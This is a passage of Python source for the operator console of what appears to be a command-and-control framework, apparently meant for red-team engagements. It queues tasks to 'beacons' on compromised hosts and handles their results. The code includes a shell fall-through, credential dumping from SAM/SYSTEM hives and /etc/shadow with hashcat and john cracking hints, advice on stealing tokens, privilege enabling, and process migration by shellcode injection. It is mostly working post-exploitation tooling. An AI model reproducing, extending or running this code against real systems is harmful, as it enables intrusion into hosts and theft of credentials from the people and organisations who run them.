            self.tp.post('/api/v1/beacons', {'current': None},
                         timeout=5.0)
        except Exception:
            pass
        self.current_beacon = None
        self._load_commands()
        print(f"{CLR['dim']}detached{CLR['reset']}")

    def _cmd_info(self):
        c = CLR
        print(f"  {c['dim']}operator {c['reset']}"
              f"{c['green']}{self.name}{c['reset']}")
        print(f"  {c['dim']}role     {c['reset']}{self.role}")
        print(f"  {c['dim']}server   {c['reset']}"
              f"{self.cfg['server_host']}:{self.cfg['server_port']}")

    def _cmd_caps(self):
        if not self.caps:
            print(f"  {CLR['dim']}(none){CLR['reset']}")
            return
        for cap in self.caps:
            print(f"  {CLR['green']}•{CLR['reset']} {cap}")

    def _cmd_audit(self, parts):
        """audit [N] | audit chat [N]

        No arguments: show the last 50 non-chat entries.
        audit N:      show the last N non-chat entries (1-500).
        audit chat:   show the last 50 chat messages.
        audit chat N: show the last N chat messages (1-500).

        Chat entries are written to the audit chain on every
        message — that is the non-repudiation property — but the
        default view filters them out so a busy room does not
        push operational entries off the window. The `chat`
        sub-command is how you ask for them explicitly.
        """
        limit = 50
        action_filter = None
        if len(parts) > 1:
            sub = parts[1].lower()
            if sub == 'chat':
                action_filter = 'chat.message'
                if len(parts) > 2:
                    try:
                        limit = max(1, min(int(parts[2]), 500))
                    except ValueError:
                        pass
            else:
                try:
                    limit = max(1, min(int(parts[1]), 500))
                except ValueError:
                    pass

        payload = {'limit': limit}
        if action_filter:
            payload['action'] = action_filter
        try:
            entries = self.tp.post('/api/v1/audit', payload)
        except Exception as exc:
            print(f"{CLR['red']}audit fetch failed: {exc}"
                  f"{CLR['reset']}")
            return
        if not entries:
            if action_filter:
                print(f"  {CLR['dim']}(no chat entries)"
                      f"{CLR['reset']}")
            else:
                print(f"  {CLR['dim']}(no entries){CLR['reset']}")
            return

        if action_filter:
            _header(f'CHAT  ·  last {len(entries)}')
        else:
            _header(f'AUDIT — last {len(entries)}')
        for e in entries:
            self._print_audit_entry(e)
        print()

    def _print_audit_entry(self, e):
        c = CLR
        ts = str(e.get('ts', ''))[:19].replace('T', ' ')
        action = str(e.get('action', '?'))
        target = str(e.get('target', '') or '')
        detail = str(e.get('detail', '') or '')
        outcome = e.get('outcome', 'ok')
        role = e.get('role', '')
        ip = e.get('source_ip', '') or ''

        if outcome == 'ok':
            out_str = f"{c['green']}ok{c['reset']}"
        elif outcome == 'denied':
            out_str = f"{c['red']}denied{c['reset']}"
        elif outcome == 'throttled':
            out_str = f"{c['yellow']}throttled{c['reset']}"
        else:
            out_str = f"{c['yellow']}{outcome}{c['reset']}"

        who = f"{c['cyan']}{e.get('operator', self.name)}{c['reset']}"
        if role and role != self.role:
            who += f"{c['dim']}@{role}{c['reset']}"
        where = f"{c['dim']}({ip}){c['reset']}" if ip else ""
        act = f"{c['bold']}{action}{c['reset']}"
        tgt = f" {c['magenta']}{target}{c['reset']}" if target else ""

        print(f"  {c['dim']}{ts}{c['reset']}  "
              f"{who} {where}  {act}{tgt}  {out_str}")
        if detail:
            text = detail if len(detail) <= 100 \
                   else detail[:97] + '...'
            print(f"      {c['dim']}{text}{c['reset']}")

    # ------------------------------------------------------------------
    # Beacon dispatch

    def _cmd_beacon(self, parts):
        """Dispatcher for attached-beacon commands.

        The client_op field on a catalogue entry says which
        specialised handler (if any) the client uses. Anything
        without a client_op is either a native verb — passed
        through unchanged — or an unknown verb, which is wrapped
        as `sh <line>` so the shell reports the error rather than
        the console.
        """
        verb = parts[0].lower()

        if verb == 'export':
            self._cmd_export(parts)
            return

        if verb == 'extension' and len(parts) > 1 \
                and parts[1].lower() == 'load':
            self._cmd_extension_load(parts)
            return

        op = self._client_ops().get(verb)

        if op == 'upload':
            self._cmd_upload(parts)
        elif op == 'download':
            self._cmd_download(parts)
        elif op == 'execmem':
            self._cmd_execmem(parts)
        elif op == 'execute_assembly':
            self._cmd_execute_assembly(parts)
        elif op == 'script':
            self._dispatch_script(verb, parts[1:])
        elif op == 'bof':
            self._cmd_bof(parts)
        elif op == 'socks':
            self._cmd_socks(parts)
        elif op == 'extension':
            self._cmd_extension_subcmd(parts)
        elif op == 'info':
            self._cmd_beacon_info()
        elif op == 'graph':
            self._cmd_graph(parts)
        elif op == 'forget':
            self._cmd_forget()
        elif op == 'detach':
            self._cmd_detach()
        elif op == 'tasks':
            self._cmd_tasks()
        elif op == 'wait':
            self._cmd_wait(parts)
        elif op == 'schedule':
            self._cmd_schedule(parts)
        elif op == 'hashdump':
            self._cmd_hashdump(parts)
        elif op == 'lsassdump':
            self._cmd_lsassdump(parts)
        elif op == 'enablepriv':
            self._cmd_enablepriv(parts)
        elif op == 'migrate':
            self._cmd_migrate(parts)
        elif op == 'shell':
            self._cmd_shell(parts)
        elif verb == 'sh' and len(parts) > 1 \
                and parts[1] == '--stdin':
            text = self._read_multiline()
            if text is None:
                print(f"{CLR['dim']}cancelled{CLR['reset']}")
                return
            self._dispatch_task(['sh', text])
        elif verb in self._native_verbs():
            self._dispatch_task(parts)
        elif verb == 'alias':
            self._cmd_alias(parts)
            return
        elif verb in ('tag', 'untag'):
            self._cmd_tag(verb, parts)
            return
        elif verb == 'note':
            self._cmd_note(parts)
            return
        elif verb == 'cancel':
            self._cmd_cancel(parts)
            return
        else:
            if self._confirm_shell_fallthrough(parts):
                self._dispatch_task(['sh'] + parts)
            else:
                print(f"{CLR['dim']}cancelled — nothing sent to "
                      f"the target{CLR['reset']}")

    def _confirm_shell_fallthrough(self, parts):
        """Ask the operator before dispatching unrecognised input
        to the beacon's shell.

        Every line the client cannot resolve to a known verb falls
        through to `sh <line>`, which means the target's shell
        executes it with the operator's arguments. That is the
        intended convenience for running an arbitrary shell command
        without prefixing it with `sh` — but it also means a typo
        (`lls` for `ls`, `whoam` for `whoami`, `ifconfg` for
        `ifconfig`) reaches the target, fails there with a shell
        error, and leaves a `beacon.use` audit entry that says the
        operator typed something they did not mean.

        The prompt names the exact line that will run on the
        target, so a mis-typed verb is visible before it is sent.
        The operator can prefix with `sh` to bypass the prompt when
        the shell form is deliberate: `sh ipconfig /flushdns` runs
        without asking, because the verb was already `sh` and the
        fall-through never fires.

        Returns True if the operator confirms, False otherwise.
        Both `y` and `yes` are accepted, case-insensitive. Anything
        else — including Enter on an empty line — is treated as a
        decline. Ctrl-C and EOF are declines too: the outer loop
        prints an `interrupted` line and the operator is back at
        the prompt with nothing sent.

        In the CLI the prompt is a multi-line string passed to
        `input()`; the terminal renders each `\n` as a line break.
        In the GUI, `input()` is intercepted by `_InputPrompt`,
        which strips the ANSI codes and renders the message as a
        wrapped label inside a modal dialog with Yes/No buttons.
        Same call, both frontends."""
        c = CLR
        line = ' '.join(parts)
        prompt = (
            f"\n"
            f"  {parts[0]!r} is not a recognised verb.\n"
            f"  If you meant to run this as a shell command, "
            f"the target will execute:\n"
            f"    sh {line}\n"
            f"  Send to the target? [y/N] "
        )
        try:
            ans = input(prompt).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return False
        return ans in ('y', 'yes')

    def _cmd_alias(self, parts):
        """alias [<name>] — set or clear this beacon's alias."""
        c = CLR
        bid = self.current_beacon
        if len(parts) < 2:
            if not self._beacon_cache:
                try:
                    rows = self.tp.post('/api/v1/beacons', {})
                    self._beacon_cache = list(rows or [])
                    self._beacon_ids = [str(b['id'])
                                        for b in rows or []]
                except Exception:
                    pass
            alias = ''
            tags = []
            for b in self._beacon_cache:
                if b.get('id') == bid:
                    alias = b.get('alias') or ''
                    tags = list(b.get('tags') or [])
                    break
            if alias:
                print(f"  {c['dim']}alias{c['reset']} "
                      f"{c['cyan']}{alias}{c['reset']}")
            else:
                print(f"  {c['dim']}(no alias set for #{bid})"
                      f"{c['reset']}")
            if tags:
                print(f"  {c['dim']}tags {c['reset']}"
                      f"{', '.join(tags)}")
            return
        alias = parts[1].strip()
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{bid}/alias',
                {'alias': alias})
        except Exception as exc:
            print(f"{c['red']}{exc}{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}{r.get('error', 'failed')}{c['reset']}")
            return
        if alias:
            print(f"{c['green']}✓{c['reset']} #{bid} → "
                f"{c['cyan']}{alias}{c['reset']}")
        else:
            print(f"{c['green']}✓{c['reset']} #{bid} alias cleared")

    def _cmd_tag(self, verb, parts):
        c = CLR
        bid = self.current_beacon
        if len(parts) < 2:
            print(f"{c['red']}usage: {verb} <tag>{c['reset']}")
            return
        tag = parts[1].strip()
        op = 'add' if verb == 'tag' else 'remove'
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{bid}/tag',
                {'op': op, 'tag': tag})
        except Exception as exc:
            print(f"{c['red']}{exc}{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}{r.get('error', 'failed')}{c['reset']}")
            return
        tags = r.get('tags') or []
        rendered = ', '.join(tags) or '(none)'
        print(f"{c['green']}✓{c['reset']} #{bid} tags: {rendered}")

    def _cmd_note(self, parts):
        """note | note set <text> | note clear | note show

        Per-beacon notes, stored server-side. Notes survive a
        beacon that goes stale and reconnects; they are keyed
        on the beacon id, not the fingerprint.
        """
        c = CLR
        bid = self.current_beacon
        sub = parts[1].lower() if len(parts) > 1 else 'show'
        if sub in ('show', 'list', 'ls'):
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/note', {'op': 'list'})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            notes = r.get('notes') or []
            if not notes:
                print(f"  {c['dim']}(no notes for #{bid})"
                      f"{c['reset']}")
                return
            _header(f'NOTES  ·  #{bid}')
            for n in notes:
                ts = time.strftime(
                    '%Y-%m-%d %H:%M',
                    time.localtime(n.get('ts', 0)))
                author = n.get('author', '?')
                print(f"  {c['dim']}{ts}  {author:<12}"
                      f"{c['reset']}{n.get('text', '')}")
            print()
            return
        if sub in ('set', 'add'):
            text = ' '.join(parts[2:]).strip()
            if not text:
                print(f"{c['red']}usage: note set <text>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/note',
                    {'op': 'add', 'text': text})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            if r.get('ok'):
                print(f"{c['green']}✓{c['reset']} note stored")
            else:
                print(f"{c['red']}{r.get('error', 'failed')}"
                      f"{c['reset']}")
            return
        if sub == 'clear':
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/note',
                    {'op': 'clear'})
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            print(f"{c['green']}✓{c['reset']} cleared "
                  f"{r.get('cleared', 0)} notes")
            return
        print(f"{c['red']}usage: note "
              f"<show|set|clear>{c['reset']}")

    def _cmd_cancel(self, parts):
        """cancel <task-id> — remove a queued task before the
        beacon picks it up.

        Only the operator who queued the task can cancel it. A
        system-queued task (one the server or the scheduler
        enqueued, with no operator name attached) can only be
        cancelled by an admin.
        """
        c = CLR
        if len(parts) < 2:
            print(f"{c['red']}usage: cancel <task-id>"
                  f"{c['reset']}")
            return
        bid = self.current_beacon
        tid = parts[1]
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{bid}/cancel/{tid}', {})
        except Exception as exc:
            print(f"{c['red']}{exc}{c['reset']}")
            return
        if r.get('ok'):
            print(f"{c['green']}✓{c['reset']} cancelled {tid}")
            return
        msg = r.get('error') or 'cancel failed'
        reason = r.get('reason') or ''
        print(f"{c['red']}{msg}{c['reset']}")
        if reason == 'not_owner':
            print(f"  {c['dim']}the pending queue only permits "
                  f"cancellation by the operator who queued the "
                  f"task. To remove it, ask that operator, or "
                  f"leave it to complete normally."
                  f"{c['reset']}")

    def _cmd_extension_subcmd(self, parts):
        """Handle `extension list` / `info` / `unload` / `call` /
        `list-loaded` without the client-side `load` preprocessing.

        `extension load` is intercepted earlier in `_cmd_beacon`
        because it requires staging a local file; every other
        sub-verb is dispatched as a plain task with the wire verb
        name the agent's extension_* handlers expect.
        """
        if len(parts) < 2:
            print(f"{CLR['red']}usage: extension "
                  f"<load|unload|list|info|list-loaded|call>"
                  f"{CLR['reset']}")
            return
        sub = parts[1].lower()
        if sub == 'unload' and len(parts) >= 3:
            self._dispatch_task(['extension_unload', parts[2]])
        elif sub == 'list':
            self._dispatch_task(['extension_list'])
        elif sub == 'list-loaded':
            self._dispatch_task(['extension_list'])
        elif sub == 'call' and len(parts) >= 3:
            self._dispatch_task(
                ['extension_call', parts[2]] + parts[3:])
        elif sub == 'info' and len(parts) >= 3:
            self._dispatch_task(['extension_info', parts[2]])
        elif sub in ('info', 'unload', 'call'):
            print(f"{CLR['red']}usage: extension {sub} <name>"
                  f"{CLR['reset']}")
        else:
            print(f"{CLR['red']}unknown extension subcommand: "
                  f"{sub}{CLR['reset']}")

    # ------------------------------------------------------------------
    # Core dispatch + wait

    def _send_and_wait(self, verb, args, timeout=120, quiet=False):
        """Send one verb to the attached beacon and wait for its result.

        Prints a single "queued <id>" line (unless quiet=True) and
        then blocks without writing anything else to stdout. No live
        spinner: the previous implementation redrew a status line on
        every poll, and any character the operator typed while the
        wait was in progress got echoed onto that same line, mangling
        both the spinner and the input prompt.

        Returns (output_bytes, error_str, exit_code).
        """
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{self.current_beacon}/task',
                {'verb': verb, 'args': args, 'timeout': timeout})
        except Exception as exc:
            return None, f"transport: {exc}", None

        if r.get('applied') and r.get('ready'):
            try:
                out = _b64.b64decode(r['output'])
            except Exception:
                out = b''
            return out, r.get('error'), r.get('exit_code', 0)

        task_id = r.get('task_id')
        if not task_id:
            return None, f"rejected: {r}", None

        if not quiet:
            print(f"{CLR['dim']}queued {task_id}{CLR['reset']}")

        started = time.time()
        deadline = started + timeout + 30

        try:
            while time.time() < deadline:
                try:
                    r = self.tp.post(
                        f'/api/v1/beacon/{self.current_beacon}'
                        f'/result/{task_id}',
                        {'wait': 1.0})
                except Exception as exc:
                    return None, f"poll: {exc}", None
                if r.get('ready'):
                    try:
                        out = _b64.b64decode(r['output'])
                    except Exception:
                        out = b''
                    return out, r.get('error'), r.get('exit_code', 0)
        except KeyboardInterrupt:
            return None, (
                f"interrupted — {task_id} is still queued and "
                f"will execute on the beacon's next poll. Run "
                f"`tasks` to see it in the pending list, or "
                f"`wait {task_id}` to block on it."), None

        return None, f"timed out after {timeout}s", None

    def _dispatch_task(self, parts):
        """Plain task dispatch for verbs that carry no client-side
        preprocessing.

        Non-blocking. The task is queued on the server and control
        returns to the prompt immediately. The result is rendered
        by the background result poller when the beacon returns
        it. Server-side intercepts (sleep, workhours) return a
        synthetic result inline and never reach the poller.
        """
        verb = parts[0]
        args = parts[1:]

        try:
            r = self.tp.post(
                f'/api/v1/beacon/{self.current_beacon}/task',
                {'verb': verb, 'args': args, 'timeout': 120})
        except Exception as exc:
            print(f"{CLR['red']}✗ {verb}{CLR['reset']}  "
                  f"{CLR['dim']}(transport: {exc}){CLR['reset']}")
            return

        if r.get('applied') and r.get('ready'):
            try:
                out = _b64.b64decode(r.get('output') or '')
            except Exception:
                out = b''
            print(f"{CLR['green']}✓{CLR['reset']} "
                  f"{CLR['cyan']}{verb}{CLR['reset']} "
                  f"{CLR['dim']}(applied server-side, takes "
                  f"effect when the beacon next polls)"
                  f"{CLR['reset']}")
            text = out.decode('utf-8', errors='replace')
            if text.strip():
                _print_wrapped(text.rstrip())
            if verb == 'sleep' and self._last_known_sleep:
                old = self._last_known_sleep
                if old > 0:
                    print(f"{CLR['yellow']}note:{CLR['reset']} "
                          f"{CLR['dim']}the beacon is still "
                          f"polling at {old}s. The new value takes "
                          f"effect within ~{old}s from now."
                          f"{CLR['reset']}")
            if verb == 'sleep' and args:
                try:
                    self._last_known_sleep = int(args[0])
                except (ValueError, IndexError):
                    pass
            return

        task_id = r.get('task_id')
        if not task_id:
            print(f"{CLR['red']}✗ {verb}{CLR['reset']}  "
                  f"{CLR['dim']}rejected: {r}{CLR['reset']}")
            return

        if self._result_poller is None:
            self._result_poller = _ResultPoller(self)

        started = time.time()
        print(f"{CLR['dim']}{task_id[:16]}{CLR['reset']}  "
              f"{CLR['cyan']}{verb}{CLR['reset']}  "
              f"{CLR['dim']}queued{CLR['reset']}")
        self._result_poller.register(
            task_id, verb, self.current_beacon, started)

    def _render_task_result(self, task_id, verb, bid, started,
                            output_b64, err, code):
        """Render a completed task result.

        Called from the result poller thread. Clears the current
        input line before printing so the result does not land in
        the middle of whatever the operator is typing; readline
        redraws the prompt on the next keystroke. Same technique
        the chat renderer uses.
        """
        elapsed = time.time() - started

        with _CHAT_OUTPUT_LOCK:
            is_tty = _COLOR and sys.stdout.isatty()
            if is_tty:
                try:
                    sys.stdout.write('\r\033[K')
                    sys.stdout.flush()
                except Exception:
                    pass

            if err is not None:
                print(f"{CLR['red']}✗ {verb}{CLR['reset']}  "
                      f"{CLR['dim']}(#{bid}, {elapsed:.2f}s)"
                      f"{CLR['reset']}")
                for line in str(err).splitlines():
                    print(f"  {CLR['red']}{line}{CLR['reset']}")
                return

            try:
                out = _b64.b64decode(output_b64 or '')
            except Exception:
                out = b''

            text = out.decode('utf-8', errors='replace').rstrip()
            nbytes = len(out)

            exit_note = f"  exit {code}" if code else ""
            size_note = ""
            if nbytes > 1024:
                size_note = f"  {_human_bytes(nbytes)}"

            print(f"{CLR['green']}✓{CLR['reset']} "
                  f"{CLR['cyan']}{verb}{CLR['reset']}"
                  f"{CLR['dim']}  #{bid}  {elapsed:.2f}s"
                  f"{size_note}{exit_note}{CLR['reset']}")

            if text:
                _print_wrapped(text)
            elif not code:
                print(f"  {CLR['dim']}(no output){CLR['reset']}")

    # ------------------------------------------------------------------
    # Credential collection

    def _cmd_hashdump(self, parts):
        """hashdump [<outdir>]

        Reads local credential material from the beacon and
        writes it locally.

          Windows: reads the SAM and SYSTEM hives, then runs
                   secretsdump.py against them if it is on PATH.
                   The hives are not decrypted on the target —
                   the agent does one registry read and hands off
                   the bytes.

          Linux:   reads /etc/passwd and /etc/shadow, merges them
                   into unshadow(8) format, and writes both the
                   raw files and the merged view. The hashes are
                   the deliverable; there is nothing to decrypt.

        The output directory defaults to
        loot/hashdump-<beacon-id>-<timestamp>/, so a single
        engagement that dumps several hosts does not collide.
        """
        c = CLR
        if not self.current_beacon:
            print(f"{c['red']}attach to a beacon first{c['reset']}")
            return

        print(f"{c['cyan']}[*]{c['reset']} reading credential "
              f"material from #{self.current_beacon}")

        out, err, _ = self._send_and_wait(
            'hashdump', [], timeout=180)
        if err is not None:
            print(f"{c['red']}hashdump failed: {err}{c['reset']}")
            if 'SeBackupPrivilege' in str(err):
                print(f"  {c['dim']}the beacon's token does not "
                      f"hold SeBackupPrivilege. Run `whoami /priv` "
                      f"to confirm, or steal a token from a "
                      f"process that holds it (an elevated "
                      f"svchost or a backup service)."
                      f"{c['reset']}")
            return

        text = (out or b'').decode('utf-8', errors='replace').strip()
        try:
            env = json.loads(text)
        except Exception as exc:
            print(f"{c['red']}hashdump: unparseable response: "
                  f"{exc}{c['reset']}")
            return

        if 'sam_b64' in env:
            self._hashdump_render_windows(env, parts)
        elif 'passwd_b64' in env:
            self._hashdump_render_linux(env, parts)
        else:
            print(f"{c['red']}hashdump: response has no recognised "
                  f"credential material{CLR['reset']}")

    def _hashdump_outdir(self, parts):
        """Common outdir resolution: operator-supplied path, or a
        per-beacon timestamped directory under loot/."""
        if len(parts) > 1:
            return parts[1]
        stamp = time.strftime('%Y%m%d_%H%M%S')
        return os.path.join(
            'loot', f"hashdump-{self.current_beacon}-{stamp}")

    # ---- Windows ----------------------------------------------------

    def _hashdump_render_windows(self, env, parts):
        c = CLR
        try:
            sam = _b64.b64decode(env['sam_b64'])
            system = _b64.b64decode(env['system_b64'])
        except Exception as exc:
            print(f"{c['red']}hashdump: hive decode failed: "
                  f"{exc}{c['reset']}")
            return

        if hashlib.sha256(sam).hexdigest() != env.get('sam_sha256'):
            print(f"{c['red']}hashdump: SAM sha256 mismatch — "
                  f"refusing to write{c['reset']}")
            return
        if hashlib.sha256(system).hexdigest() != \
                env.get('system_sha256'):
            print(f"{c['red']}hashdump: SYSTEM sha256 mismatch — "
                  f"refusing to write{c['reset']}")
            return

        outdir = self._hashdump_outdir(parts)
        os.makedirs(outdir, exist_ok=True)
        sam_path = os.path.join(outdir, 'SAM')
        sys_path = os.path.join(outdir, 'SYSTEM')
        with open(sam_path, 'wb') as fh:
            fh.write(sam)
        with open(sys_path, 'wb') as fh:
            fh.write(system)

        print(f"{c['green']}✓{c['reset']} wrote "
              f"{_human_bytes(len(sam))} SAM and "
              f"{_human_bytes(len(system))} SYSTEM to "
              f"{c['cyan']}{outdir}{c['reset']}")

        # ---- First pass: try every secretsdump form ----
        parsed = _run_secretsdump(sam_path, sys_path)

        # ---- Fall back to the native parser ----
        if parsed is None:
            print(f"{c['yellow']}[*]{c['reset']} secretsdump is "
                  f"not available — parsing the hives with the "
                  f"native parser")
            parsed = _run_native_parser(sam, system)

        # ---- Both paths failed ----
        if parsed is None:
            print()
            print(f"  {c['dim']}Neither secretsdump nor the "
                  f"native parser recovered any hashes. The "
                  f"hives were saved and are intact — recover "
                  f"manually with:{c['reset']}")
            print(f"    {c['cyan']}pip install impacket"
                  f"{c['reset']}")
            print(f"    {c['cyan']}impacket-secretsdump -sam "
                  f"{sam_path} -system {sys_path} LOCAL"
                  f"{c['reset']}")
            return

        if not parsed:
            print(f"  {c['dim']}hives parsed but no usable "
                  f"hashes were found (empty or placeholder "
                  f"hashes only){c['reset']}")
            return

        print()
        print(f"  {c['dim']}{len(parsed)} credential(s) "
              f"recovered. Add them to the vault:{c['reset']}")
        for row in parsed:
            dom = row.get('domain', '')
            who = row.get('user', '')
            ntlm = row.get('ntlm', '')
            lm = row.get('lm', '')
            hint = ntlm or lm
            if not hint:
                continue
            print(f"    {c['cyan']}creds add --user {who} "
                  f"--domain {dom} --kind ntlm --value {hint} "
                  f"--source {self.current_beacon}{c['reset']}")

    # ---- Linux ------------------------------------------------------

    @staticmethod
    def _crypt_kind(hash_field):
        """Classify a crypt(3) hash by its prefix. Returns
        (name, hashcat_mode) or ('unknown', 0)."""
        for prefix, name, mode in (
                ('$1$',    'md5crypt',    500),
                ('$2a$',   'bcrypt',     3200),
                ('$2b$',   'bcrypt',     3200),
                ('$2y$',   'bcrypt',     3200),
                ('$5$',    'sha256crypt', 7400),
                ('$6$',    'sha512crypt', 1800),
                ('$y$',    'yescrypt',  25600),
                ('$7$',    'scrypt',     8900),
                ('$argon2id$', 'argon2id', 0),
                ('$argon2i$',  'argon2i',  0),
                ('$argon2d$',  'argon2d',  0),
                ('{SSHA}', 'ldap-ssha',  111),
                ('{SHA}',  'ldap-sha',   101),
                ('{MD5}',  'ldap-md5',    10),
                ('$apr1$', 'apache-md5', 1600),
        ):
            if hash_field.startswith(prefix):
                return name, mode
        # Locked or empty. Both are informative but neither is a
        # crackable hash.
        if hash_field in ('!', '*', '!!', ''):
            return 'locked', 0
        if hash_field.startswith('!') or hash_field.startswith('*'):
            return 'locked', 0
        return 'unknown', 0

    def _hashdump_render_linux(self, env, parts):
        c = CLR

        try:
            passwd = _b64.b64decode(env['passwd_b64'])
        except Exception as exc:
            print(f"{c['red']}hashdump: passwd decode failed: "
                  f"{exc}{c['reset']}")
            return

        if hashlib.sha256(passwd).hexdigest() != \
                env.get('passwd_sha256'):
            print(f"{c['red']}hashdump: /etc/passwd sha256 "
                  f"mismatch — refusing to write{CLR['reset']}")
            return

        shadow = None
        if 'shadow_b64' in env:
            try:
                shadow = _b64.b64decode(env['shadow_b64'])
            except Exception as exc:
                print(f"{c['red']}hashdump: shadow decode failed: "
                      f"{exc}{c['reset']}")
                return
            if hashlib.sha256(shadow).hexdigest() != \
                    env.get('shadow_sha256'):
                print(f"{c['red']}hashdump: /etc/shadow sha256 "
                      f"mismatch — refusing to write{CLR['reset']}")
                return

        outdir = self._hashdump_outdir(parts)
        os.makedirs(outdir, exist_ok=True)

        passwd_path = os.path.join(outdir, 'passwd')
        with open(passwd_path, 'wb') as fh:
            fh.write(passwd)

        shadow_path = None
        if shadow is not None:
            shadow_path = os.path.join(outdir, 'shadow')
            with open(shadow_path, 'wb') as fh:
                fh.write(shadow)

        combined = env.get('combined') or ''
        combined_path = os.path.join(outdir, 'combined.txt')
        with open(combined_path, 'w', encoding='utf-8') as fh:
            fh.write(combined)

        written = f"wrote {_human_bytes(len(passwd))} /etc/passwd"
        if shadow is not None:
            written += (f", {_human_bytes(len(shadow))} /etc/shadow")
        print(f"{c['green']}✓{c['reset']} {written} to "
              f"{c['cyan']}{outdir}{c['reset']}")

        if shadow is None:
            print()
            print(f"  {c['yellow']}/etc/shadow was not readable."
                  f"{c['reset']}")
            if env.get('shadow_error'):
                print(f"  {c['dim']}{env['shadow_error']}"
                      f"{c['reset']}")
            print(f"  {c['dim']}the beacon is almost certainly not "
                  f"running as root, and no stolen token with the "
                  f"right uid was in place. The /etc/passwd content "
                  f"is still useful for user enumeration, but there "
                  f"are no hashes to crack without shadow."
                  f"{c['reset']}")
            return

        n = int(env.get('combined_count') or 0)
        if n == 0:
            print(f"  {c['dim']}no passwd entries had a matching "
                  f"shadow entry. On a host using SSSD, LDAP, or "
                  f"NIS, the hashes may not be in /etc/shadow at "
                  f"all.{c['reset']}")
            return

        # Distribution of crypt kinds across the recovered
        # hashes, so the operator knows which hashcat mode to
        # reach for without opening the file.
        kinds = {}
        for line in combined.splitlines():
            fields = line.split(':')
            if len(fields) < 2:
                continue
            kind, _mode = self._crypt_kind(fields[1])
            kinds[kind] = kinds.get(kind, 0) + 1

        print()
        print(f"  {c['dim']}{n} hash(es) recovered:{c['reset']}")
        for kind, count in sorted(kinds.items(),
                                  key=lambda kv: -kv[1]):
            print(f"    {c['cyan']}{count:>5}{c['reset']}  {kind}")

        # A hashcat hint based on the most common non-locked kind.
        crackable = [(k, v) for k, v in kinds.items()
                     if k != 'locked' and k != 'unknown']
        if crackable:
            top_kind = max(crackable, key=lambda kv: kv[1])[0]
            _, mode = self._crypt_kind(
                {'md5crypt': '$1$', 'bcrypt': '$2b$',
                 'sha256crypt': '$5$', 'sha512crypt': '$6$',
                 'yescrypt': '$y$', 'scrypt': '$7$',
                 'ldap-ssha': '{SSHA}', 'ldap-sha': '{SHA}',
                 'ldap-md5': '{MD5}', 'apache-md5': '$apr1$',
                }.get(top_kind, ''))
            if mode:
                print()
                print(f"  {c['dim']}crack with hashcat:{c['reset']}")
                print(f"    {c['cyan']}hashcat -m {mode} "
                      f"{combined_path} <wordlist>{c['reset']}")
            print(f"  {c['dim']}or john:{c['reset']}")
            print(f"    {c['cyan']}john {combined_path}{c['reset']}")

        print()
        print(f"  {c['dim']}add to the vault (kind=other — the "
              f"vault has no dedicated crypt kind):{c['reset']}")
        shown = 0
        for line in combined.splitlines():
            fields = line.split(':')
            if len(fields) < 2:
                continue
            kind, _mode = self._crypt_kind(fields[1])
            if kind in ('locked', 'unknown', '') or not fields[1]:
                continue
            who = fields[0]
            value = fields[1].replace("'", "'\\''")
            print(f"    {c['cyan']}creds add --user {who} "
                  f"--kind other --value '{value}' "
                  f"--source {self.current_beacon}{c['reset']}")
            shown += 1
            if shown >= 5:
                break
        if shown == 0:
            print(f"    {c['dim']}(no crackable hashes to add)"
                  f"{c['reset']}")
        elif shown < n:
            print(f"    {c['dim']}… and {n - shown} more in "
                  f"{combined_path}{c['reset']}")

    _ENABLEPRIV_USAGE = (
        "enablepriv — list, enable, or disable Windows token "
        "privileges (current process).\n"
        "\n"
        "Usage:\n"
        "  enablepriv --list                "
        "Show privileges in the token\n"
        "  enablepriv --list-all            "
        "Show the full catalogue with token status\n"
        "  enablepriv --vuln                "
        "Group held privileges by security risk\n"
        "  enablepriv <privilege>           "
        "Enable a privilege\n"
        "  enablepriv <privilege> --disable "
        "Disable a privilege\n"
        "  enablepriv --all                 "
        "Enable every held privilege\n"
        "  enablepriv --all --disable       "
        "Disable every held privilege\n"
        "\n"
        "Privilege name forms (all equivalent):\n"
        "  SeDebugPrivilege   DebugPrivilege   debug\n"
        "\n"
        "The change applies to the current process token only. It\n"
        "is reverted when the agent exits. Privileges absent from\n"
        "the token cannot be added here — a fresh logon with the\n"
        "right rights is required for those."
    )

    @staticmethod
    def _enablepriv_state_marker(state, c):
        return {
            'ENABLED':  f"{c['green']}[+]{c['reset']}",
            'DISABLED': f"{c['yellow']}[ ]{c['reset']}",
            'REMOVED':  f"{c['red']}[-]{c['reset']}",
        }.get(state, f"{c['red']}[x]{c['reset']}")

    def _render_inline_result(self, verb, out, err, code=None):
        """Render the result of a blocking _send_and_wait call.

        Used by client handlers that want inline (blocking) result
        display rather than the async poller path. The output
        format is the same the poller would print, so a migrated
        beacon's confirmation line looks the same whether it
        arrived inline or asynchronously.
        """
        c = CLR
        if err is not None:
            print(f"{c['red']}✗ {verb}{c['reset']}")
            for line in str(err).splitlines():
                print(f"  {c['red']}{line}{c['reset']}")
            return
        text = (out or b'').decode(
            'utf-8', errors='replace').rstrip()
        exit_note = f"  {c['dim']}exit {code}{c['reset']}" \
                    if code else ""
        print(f"{c['green']}✓{c['reset']} "
              f"{c['cyan']}{verb}{c['reset']}{exit_note}")
        if text:
            _print_wrapped(text)

    def _cmd_migrate(self, parts):
        """migrate --self | <pid> | <process-name> [--method <name>]

        Two forms:

            --self          Detach a copy of the agent's on-disk
                            binary as a child process and exit the
                            parent. The session survives on the
                            child with the same beacon ID. No
                            injection — the on-disk source is
                            re-exec'd with a fresh readiness
                            handshake.

            <pid> | <name>  Inject the agent's embedded shellcode
                            into a foreign process. Requires a
                            build with "inject": true. The parent
                            unlinks its own on-disk binary five
                            seconds after a successful injection.

        The injection form accepts --method:

            default  CreateRemoteThread (Windows) or ptrace
